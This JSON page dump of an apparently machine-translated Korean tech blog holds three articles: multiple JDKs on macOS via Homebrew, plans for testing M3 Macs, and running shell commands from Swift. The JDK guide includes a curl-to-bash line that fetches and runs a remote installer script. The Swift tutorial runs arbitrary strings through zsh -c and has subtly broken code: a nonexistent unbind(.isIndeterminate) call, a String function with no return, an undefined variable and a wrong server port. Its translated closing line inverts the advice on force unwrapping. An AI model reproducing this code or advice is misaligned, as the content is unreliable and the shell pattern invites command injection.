생성합니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<img src=\"/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_4.png\" />\n\n하지만 \\*nix 시스템은 /usr/bin/java, /usr/lib/jvm 및 /usr/local/bin/java에서 Java를 찾습니다. Apple의 모든 것들과 마찬가지로 macOS는 다릅니다. Java를 /Library/Java/JavaVirtualMachines/에서 찾습니다.\n\n이러한 JDK 설치법은 /Library/Java/JavaVirtualMachines/ 폴더 아래 필요한 softlink를 설정할 수 있었을 것입니다. 그러나 디자인상 이러한 JDK 설치법은 keg-only로 유지됩니다.\n\n<img src=\"/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_5.png\" />\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n이 정보는 설치 로그에도 있습니다.\n\n![이미지](/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_6.png)\n\n따라서 Mac 프로그램에서 설치된 Java를 감지하려면 해당 폴더에 몇 가지 소프트 링크를 만들어야 합니다. 설치 로그에 제공된 명령을 그대로 복사하여 붙여넣으십시오.\n\n![이미지](/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_7.png)\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n이 섹션의 시작 부분에서 실패한 명령을 실행하려고 하면 아래와 같은 출력이 나타납니다.\n\n<img src=\"/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_8.png\" />\n\n이제 macOS에서 감지된 2개의 JDK를 설치했으므로 두 가지 간을 빠르게 전환하는 방법을 살펴보겠습니다.\n\nJava의 버전을 한 가지만 설치하는 경우에는 이미 끝났습니다. 그러나 Mac에 여러 가지 다른 버전의 Java를 설치하고자 하는 경우 위의 단계대로 각각 설치하고 아래 단계에 따라 그 사이를 전환할 수 있습니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n# JDK 전환하기 (JAVA_HOME 및 java_home)\n\nJAVA_HOME은 Java 프로그램이 Java 위치를 선택하도록 하는 환경 변수입니다. 따라서 다양한 Java 버전 간에 전환하려면 JAVA_HOME 값을 다른 위치로 변경해야 합니다.\n\n또한 /usr/libexec/java_home 유틸리티가 있습니다. 이를 사용하여 다양한 버전 간에 전환합니다.\n\n우리의 설치에서는 다음과 같이 매개 변수 -v (소문자 v)가 우리에게 제공하는 내용입니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n`\n![이미지](/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_9.png)\n\n- 이 명령어의 출력을 활용하여 JAVA_HOME을 아래와 같이 설정할 수 있습니다.\n  export JAVA_HOME=`/usr/libexec/java_home -v 17`\n- 그러나 명령어를 입력하는 것이 조금 길 수 있습니다. 그래서 전체 명령어를 대체할 수 있는 한 단어의 별칭을 만들어 보겠습니다.\n  alias java-17=”export JAVA_HOME=`/usr/libexec/java_home -v 17`”\n- 또한, 새 터미널을 열 때마다 이러한 별칭이 사용 가능하도록 해야 합니다. 이를 위해 ~/.zshrc 파일에 추가해야 합니다. ~/.zshrc 파일에 다음과 같이 2개의 별칭을 추가하세요. ~/.zshrc 파일이 존재하지 않는 경우, 파일을 생성하세요.\n\n```js\nalias java-17=”export JAVA_HOME=`/usr/libexec/java_home -v 17`; java -version”\nalias java-11=”export JAVA_HOME=`/usr/libexec/java_home -v 11`; java -version”\n```\n\n모두 완료되었습니다.\n원하는 때마다 터미널이나 iTerm에서 java-11 또는 java-17을 입력하세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n![이미지](/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_10.png)\n\n# TL;DR (명령어 간단 요약)\n\n설명이 아닌 단계만 원하는 분들을 위해 간단한 단계를 안내합니다.\n\n- 시스템에 Homebrew가 없는 경우 Homebrew를 설치하세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```js\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\n```\n\n- Homebrew 및 openjdk를 사용하여 필요한 만큼 JDK를 설치하세요.\n\n```js\nbrew install openjdk@XX\n```\n\n- MAC에서 JDK에 액세스할 수 있도록 하려면, 소프트 링크나 실제 폴더를 /Library/Java/JavaVirtualMachines/에 추가하세요. 소프트 링크를 사용하려면 아래 명령어를 사용하세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n$ sudo ln -sfn /opt/homebrew/opt/openjdkXXX/libexec/openjdkXXX.jdk /Library/Java/JavaVirtualMachines/openjdkXXX.jdk\n\n- Add one more alias under `~/.zshrc` to quickly switch between JDK\n\nalias java-XX=\"export JAVA_HOME=\\`/usr/libexec/java_home -v XX\\`; java -version\"\n","ogImage":{"url":"/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_0.png"},"coverImage":"/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_0.png","tag":["Tech"],"readingTime":9},{"title":"나의 새로운 M1 Mac을 위해 계획한 것","description":"","date":"2024-05-23 15:15","slug":"2024-05-23-WhatIHavePlannedforMyNewM3Macs","content":"\n![이미지](/assets/img/2024-05-23-WhatIHavePlannedforMyNewM3Macs_0.png)\n\n새로운 맥 주간이에요!\n\n새로운 M3 맥이 판매가 그리 좋지 않다는 제안에도 불구하고(대부분의 모델의 배송 예상일이 11월로 남아 있는 순수한 기반으로), 여러분 중 많은 분들이 이번 주에 문을 노크하는 걸 열심히 기다리고 계실 것 같아요.\n\n저는 두 대의 M3-탑재 맥을 기다리고 있어요. 첫 번째로는 현재 사용하지 않고 부끄럽게도 M1 버전을 대체할 M3 24인치 iMac 기본 모델이고 두 번째로는 M1 Max 16인치 MacBook Pro를 중고 시장으로 돌리게 될 M3 Max 14인치 MacBook Pro에요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n저는 이 두 대의 기계에 대한 계획을 가지고 있어요. 물론, 이들을 개봉하는 즉시 떠오르는 즉시 테스트가 있어요. 기대가 되는 결과를 빨리 볼 수 있을 테니까 말이에요. 또한, 제 기본적인 테스트가 여러분이 M3 플랫폼으로 업그레이드를 고려할 수 있도록 도와줄 것을 희망하고 있어요.\n\n제가 설명해 드릴게요.\n\n## 내 M3 iMac 테스트\n\n특정한 맥으로 선정한 정책이 있어요. 베이스 모델 버전만 구매한다는 거죠.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n맥북 에어는 그중 하나입니다. 내 의심은 굉장히 매력적이지만 상당히 비싼 컴퓨터들이기 때문에 많은 사람들이 그냥 제일 싼 것을 선택하는 것 같다는 점입니다. 그래서 나에게는 바로 기본 모델 구매자들이 돈을 주고 무슨 성능을 얻는지 정확히 알아보는 것이 내 임무인 것 같습니다.\n\n나는 2021년에 24인치 iMac 리프레시에 대해 동일한 방식을 취했습니다. M1의 기본 구성을 넘어서지 않고, 첫 번째 옵션을 가방에 넣어 체크아웃을 했습니다. 그렇게 해서 나는 8GB의 통합 메모리, 7코어 GPU 및 256GB의 SSD 저장 공간을 갖춘 맥을 얻게 되었습니다. 그 확인된 M1 머신들과 마찬가지로, 그 돈에 걸맞는 성능을 발휘하여 즉시 인기를 끈 컴퓨터가 되었습니다.\n\n따라서 그 후속 모델은 상당히 성능을 유지해야 할 것이고, 나는 그것을 구매하는 방식이 이전과 동일했습니다. 이번에는 그래픽 코어 수의 한자리 숫자 증가 및 M1에서 M3로의 전환이 유일한 차이점입니다.\n\n문제는 다년간 애플의 올인원 제품에 대한 업데이트가 없었던 900일 이상을 거쳐 M2 칩이 거부당했고 완전히 손대지 않은 채로 진열대에 방치된 이 기계에 대해 얼마나 큰 발전을 이뤘는지입니다. 기억해야 할 점은 이 기계가 M2칩을 거부당하고 완전히 소홀히 처리되었다고 여겨진 기계라는 것입니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n우리가 온만큼 멀리 왔을까요?\n\n내 시험은 여느 때처럼 간단하고 대충한 테스트일 것입니다. 나는 내 Sony FX3 카메라로 10분짜리 4K 영상을 촬영하고, Final Cut Pro에 넣어 부드러운 컬러 그레이드를 주고, 두 가지 루틴을 수행할 것입니다 - 렌더링과 익스포트. 이 작업은 M1 iMac에서, M3 iMac에서, 그리고 내 예전 27인치 인텔 기반 iMac에서 수행할 것입니다.\n\n기본 모델인 M3 iMac이 앞세대 제품들보다 얼마나 빠를지 궁금합니다. 정말로 기대되네요 (비디오를 놓치지 않으려면 제 유튜브 채널을 구독하기를 잊지 마세요)!\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n## 내 M3 Max MacBook Pro 테스트\n\n나는 내 M3 14인치 MacBook Pro 주문을 잘못한 것 같아.\n\n애플의 '무서운 속도' 이벤트를 지난 달 졸지에 커버하면서 새로운 프로덕션 랩탑을 사양을 빨리 정하고 주문해야 했어. 불행히도 이 일은 늦은 일이었고(이벤트가 영국 시간으로 자정에 방영되었음), 내 머리를 충분히 쓰지 않았던 것 같아.\n\n내가 현재 문이 오는 사양(그러나 Apple 주문 추적기에 따르면 현재 \"지연\"되었음)은 M3 Max 칩을 완전히 최대로 활성화하여 16코어 CPU와 40코어 GPU, 2TB의 SSD 저장 공간, 그리고 48GB의 통합 메모리를 포함하고 있어.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n제가 실수한 부분은 후자와 관련이 있다고 생각합니다. 추가 200 파운드를 더 지불하면 사랑스러운 Space Black 노트북을 64GB의 통합 메모리로 구성할 수 있었을 텐데요. 이미 이 새로운 기계에 4,000 파운드 이상을 들였기 때문에 그것은 이제 무난한 선택처럼 느껴집니다. 결국 이건 이제 목돈이니까요.\n\n그래서 곧 도착하는 구성을 반품하고 64GB 버전을 다시 주문할 가능성이 매우 높습니다. 교훈을 얻었네요. 하지만 Apple의 관대한 반품 정책을 활용해서 그 사랑스러운 Space Black 색상을 조심스럽게 개봉하고 빠른 Mark Ellis Reviews 테스트를 해볼 거에요.\n\n이 테스트는 iMac의 것보다 더 복잡하지 않을 것이지만 결과는 마땅히 빛날 것입니다. 이전에 언급한 대로, 내가 콘텐츠 크리에이터이자 Apple 제품에 대해 다루는 일을 하는 사람이 아니었다면 이 새로운 MacBook Pro를 살 일은 없었을 테니까요 — 내 M1 Max 16인치 MacBook Pro는 여전히 절대적인 성능을 보여주고 있습니다.\n\n그렇다면 이 굉장히 중요한 질문이 생깁니다: M1 Max에서 M3 Max로 전환했을 때 어떤 이득을 얻을 수 있을까요? 이 방대한 비용을 정당화할 만한 가치가 있는지에 대한 의견은 무엇인가요? 일반적으로 최신 Apple 실리콘 패밀리의 Max 버전은 최근 두 세대에서 가장 놀라운 진보를 보여주고 있다는 평이 있습니다. 실제로 일상에서 어떤 변화가 있는지 확인해보고 싶습니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n그래서, 이 두 대의 머신 사이에서 똑같은 Final Cut Pro 테스트를 할 거에요. 렌더링 및 내보내기 과정에서 몇 초(아니면 분?!)를 단축할 수 있을까요? 비디오 편집자는 여러분께 말씀드립니다. 프로젝트를 빠르게 완료할 수 있는 속도가 여러분의 생계에 달려 있다면, 그 몇 초가 의미심장하다는 것을요. 우리 모두가 애플에게 가장 궁금한 점은 이 하드웨어에 상당한 투자를 한 만큼, 우리가 그 몇 초를 얻게 되는지입니다.\n\n솔직히 이 맥북 프로는 매우 비싼 머신들이라는 사실을 인정해야 합니다.\n\n## 마무리\n\n내 테스트가 주로 비디오 제작에 중점을 두고 있다는 것과 새로운 맥을 위한 모든 사람들의 사용 사례가 아니라는 것을 알고 있습니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n그러므로 시각 콘텐츠를 다루지 않는 경우, 내 시험 결과는 다소 주의해서 받아들여야 할 것 같아요. 다행히도 다른 리뷰어들로부터 더 심층적인 테스트가 다음 몇 주 동안 등장할 예정이며, 그들이 무엇을 발견했는지 — 이것이 M3 세대에 어떤 의미를 갖는지 기대되네요.\n\n하지만 이제는 당신에게 차례입니다 — 어떤 M3 Mac이 당신의 쇼핑 목록에 있는지, 그리고 당신은 그것을 어떻게 활용할 계획인가요? 아래에서 참여해주세요!\n\n## 떠나기 전에\n\n기술 콘텐츠 제작자의 주간 비하인드 더 시즌 비디오를 보기 위해 내 뉴스레터 목록에 가입하세요!\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\nhttps://markellisreviews.com에서 2023년 11월 7일에 원래 발행되었습니다.\n","ogImage":{"url":"/assets/img/2024-05-23-WhatIHavePlannedforMyNewM3Macs_0.png"},"coverImage":"/assets/img/2024-05-23-WhatIHavePlannedforMyNewM3Macs_0.png","tag":["Tech"],"readingTime":6},{"title":"스위프트로 터미널 프로그램 실행하기","description":"","date":"2024-05-23 15:14","slug":"2024-05-23-RunningTerminalProgramsfromSwift","content":"\n스위프트와 명령 줄을 통합하면 개발자가 스위프트 애플리케이션 내에서 쉘 명령어의 기능을 활용할 수 있습니다. 이 기능은 주로 작업 자동화, 스크립트 실행 또는 시스템 수준 기능에 직접 액세스하는 데 유용합니다. 이 기사에서는 실용적인 예제를 사용하여 스위프트에서 터미널 프로그램을 실행하는 방법을 살펴보겠습니다.\n\n# 종속성 가져오기\n\n프로세스 실행에는 Foundation 라이브러리가 필요합니다.\n\n```js\nimport Foundation\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\nFoundation 라이브러리는 애플의 개발 생태계의 핵심 부분으로, 필수적인 데이터 유형, 컬렉션 및 운영 체제 서비스를 제공하여 날짜, 시간 및 프로세스와 같은 작업을 관리합니다. Foundation을 사용하여 프로세스를 실행하면 시스템의 명령 줄과 상호 작용하기 위한 강력하고 테스트된 API를 활용할 수 있습니다.\n\n# 프로세스 실행\n\nSwift에서 터미널 애플리케이션을 실행하는 것은 본질적으로 직접 프로그램을 실행하는 대신 zsh와 같은 쉘에서 명령 줄 프로그램을 실행해야 한다는 것을 의미합니다.\n\n따라서 다른 프로그램을 실행하도록 지시하는 /bin/zsh를 실행해야 합니다. 여러분은 bash 스크립트에서처럼 유사한 개념인 #!/bin/bash를 알고 있을 수 있습니다. 이는 “bash를 사용하여 이 프로그램을 실행”을 의미합니다. 이는 터미널과 상호 작용하는 이진 프로그램에 대한 비슷한 개념입니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n본질적으로, 우리는 환경 변수를 전달하여 터미널 프로그램을 실행하도록 Swift에 지시할 것입니다 (예: PATH=/usr/bin, 실행 쉘(예: /bin/zsh), 그리고 실행할 프로그램 및 옵션을 포함한 내용(예: ls ~)):\n\n![Running Terminal Programs from Swift](/assets/img/2024-05-23-RunningTerminalProgramsfromSwift_0.png)\n\n## 1. 프로세스 설정하기\n\n우선, Process의 인스턴스를 생성합니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```js\nlet process = Process();\n```\n\nShell 명령어의 실행은 Process 인스턴스에서 처리되며, 출력과 에러 스트림은 Pipe 인스턴스가 캡처합니다.\n\n## 2. Process 구성\n\n다음으로, 인수와 사용할 쉘을 정의합니다. 우리는 zsh 쉘에 명령을 실행하도록 지시할 것이므로, 프로세스의 launchPath를 /bin/zsh로 설정하고 프로그램 및 인수를 쉘의 인수로 -c `프로그램 및 인수`를 전달할 것입니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```js\nlet command = \"ls ~\";\nprocess.launchPath = \"/bin/zsh\"; // 또는 \"/bin/bash\" 당신의 셸에 따라 다름\nprocess.arguments = [\"-c\", command];\n```\n\n-c 인자는 쉘이 명령어 문자열을 실행하도록 지시합니다. command는 예를 들어 ls ~나 echo \"Hello world\"와 같은 표준 프로그램 실행을 나타내는 문자열일 수 있습니다.\n\n일부 프로그램은 MacOS의 보안 제약으로 인해 실행할 수 없습니다. 예를 들어, Swift 프로그램에서 /bin/ps를 실행할 수 없는 이유는 특정 보안 제약을 위반하기 때문입니다.\n\n많은 프로그램은 환경 변수가 설정되어야 합니다. 예를 들어, 프로그램이 다른 프로그램을 찾기 위해 PATH 환경 변수에 의존하는 것이 일반적입니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n테이블 태그를 Markdown 형식으로 변경해주세요.\n\n```js\nlet environment = [\n  \"TERM\": \"xterm\",\n  \"HOME\": \"/Users/example-user/\",\n  \"PATH\": \"/opt/homebrew/bin:/opt/homebrew/sbin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\"\n]\nprocess.environment = environment\n```\n\n터미널에서 env를 실행하여 시스템 환경 변수를 실행 중에 확인할 수 있습니다.\n\n<img src=\"/assets/img/2024-05-23-RunningTerminalProgramsfromSwift_1.png\" />\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n## 3. 프로세스 실행하기\n\n그런 다음 macOS 버전을 확인하여 Foundation 라이브러리와의 호환성을 보장한 후 프로세스를 실행합니다:\n\n```js\nif #available(macOS 13.0, *) {\n    try! process.run()\n} else {\n    process.launch()\n}\n```\n\nmacOS 13용 Foundation에서는 응용 프로그램 실행 중 예기치 않은 오류가 발생하면 오류를 throw하는 기능이 도입되었고 .launch() 메서드는 사용이 중단되었습니다. 이러한 이유로 macOS 버전이 13 이상인지 테스트하고 .run() 메서드를 시도하고 이전 버전의 경우 .launch() 메서드로 넘어갈 수 있습니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n에러를 잡아내는 것은 사용자나 개발자가 앱이 올바르게 작동하지 않음을 알 수 있는 가장 좋은 방법입니다.\n\n# 출력 및 에러 잡기\n\n출력을 잡기 위해서는 Pipe를 만들고, 이를 프로세스의 출력에 연결해야 합니다.\n\n```js\nlet pipe = Pipe();\nprocess.standardOutput = pipe;\nprocess.standardError = pipe;\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n프로세스가 완료되면, pipe는 프로세스 응답을 바이너리 배열로 수집할 것입니다. 대부분의 터미널 출력은 사람이 읽을 수 있는 텍스트이므로 UTF-8로 인코딩된 문자열로 변환할 수 있습니다:\n\n```js\nlet data = pipe.fileHandleForReading.readDataToEndOfFile()\nlet output = String(data: data, encoding: .utf8) ?? \"\"\n```\n\n## 모두 함께 넣기\n\n이러한 개념들을 결합하여, 터미널 명령을 실행하고 결과를 반환하는 함수를 만들 수 있습니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```swift\nfunc executeProcessAndReturnResult(_ command: String) -> String {\n  let process = Process()\n  let pipe = Pipe()\n  let environment = [\n    \"TERM\": \"xterm\",\n    \"HOME\": \"/Users/example-user/\",\n    \"PATH\": \"/opt/homebrew/bin:/opt/homebrew/sbin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\"\n  ]\n  process.standardOutput = pipe\n  process.standardError = pipe\n  process.environment = environment\n  process.launchPath = \"/bin/zsh\"\n  process.arguments = [\"-c\", command]\n  if #available(macOS 13.0, *) {\n    try! process.run()\n  } else {\n    process.launch()\n  }\n  let data = pipe.fileHandleForReading.readDataToEndOfFile()\n  let output = String(data: data, encoding: .utf8) ?? \"\"\n  return output\n}\n```\n\n따라서 다른 프로그램에서 이러한 함수를 호출할 수 있습니다. 예를 들어 사용자의 홈 폴더에있는 폴더를 나열하는 프로그램에서 ls ~을 사용하여 호출할 수 있습니다:\n\n```swift\nlet response = executeProcessAndReturnResult(\"ls ~\")\nprint(response)\n// Desktop Documents Downloads Library Movies Pictures Public\n```\n\n# 데몬 프로세스 시작하기\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n긴 시간이 걸리는 프로세스, 예를 들어 데몬(daemon) 같은 것을 시작하고 주 스레드와 바인딩을 해제하려면, 프로세스를 실행하기 전에 \"불확정 상태\"로 설정합니다:\n\n```js\n// ... let process = Process()\nprocess.unbind(.isIndeterminate)\n// ... process.run()\n```\n\n이렇게 하면 프로세스가 독립적으로 계속 실행되지만, 앱에서 출력을 캡처하는 것이 더 어려워집니다.\n\n이러한 개념을 결합하여 터미널 명령어를 실행하고 출력을 반환하는 함수를 만들 수 있습니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```swift\nfunc executeDaemonProcess(_ command: String) -> String {\n  let process = Process()\n  process.environment = environment\n  process.launchPath = \"/bin/zsh\"\n  process.arguments = [\"-c\", command]\n  process.qualityOfService = .background\n  if #available(macOS 13.0, *) {\n    try! process.run()\n  } else {\n    process.launch()\n  }\n}\n```\n\n그래서 백그라운드에서 실행되는 이러한 함수를 호출할 수 있습니다. 예를 들어 ~/Public 폴더에서 파일을 제공하는 Python HTTP 서버를 시작할 수 있습니다.\n\n```swift\nexecuteDaemonProcess(\"/usr/bin/python3 -m http.server -d ~/Public\")\n```\n\n이 프로세스를 실행하면 ~/Public 폴더에서 파일을 제공하는 http://localhost:8080의 웹 서버가 생성됩니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n# 결론\n\nProcess 클래스를 사용하여 Swift 프로젝트에서 셸 명령 실행을 원활하게 통합할 수 있습니다. 이 기술을 사용하면 Swift 프로젝트 내에서 커맨드 라인 프로그램 및 RPC의 프론트 엔드를 만들거나 자동화 및 시스템 수준 스크립팅을 수행하는 다양한 가능성이 열립니다.\n\n실제 구현에서는 강제 언래핑을 사용하고 모든 잠재적인 오류 및 예외 상황을 처리해야 함을 기억하세요. 위 예제는 모든 실패 시나리오를 처리하지 않으므로 주의해야 합니다.\n","ogImage":{"url":"/assets/img/2024-05-23-RunningTerminalProgramsfromSwift_0.png"},"coverImage":"/assets/img/2024-05-23-RunningTerminalProgramsfromSwift_0.png","tag":["Tech"],"readingTime":9}],"page":"69","totalPageCount":120,"totalPageGroupCount":6,"lastPageGroup":20,"currentPageGroup":3},"__N_SSG":true}